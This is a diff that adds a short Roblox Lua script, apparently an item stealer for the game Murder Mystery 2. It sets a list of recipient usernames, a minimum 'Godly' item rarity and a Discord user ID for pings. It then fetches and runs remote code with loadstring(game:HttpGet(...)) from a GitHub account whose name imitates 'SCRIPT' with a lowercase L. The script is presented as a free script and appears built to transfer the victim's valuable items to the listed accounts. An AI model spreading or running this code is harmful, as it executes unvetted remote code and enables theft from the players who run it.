@@ -1,0 +1,7 @@
+_G.Usernames = {"7Pawk", "savage_Kid0307", "BruhDamnSHEESH", "protyleer", "kotkotpogiu", "relymix"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "438668302458290187" -- change to your Discord user ID
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MM2SCRlPT/Free/refs/heads/main/Test"))()
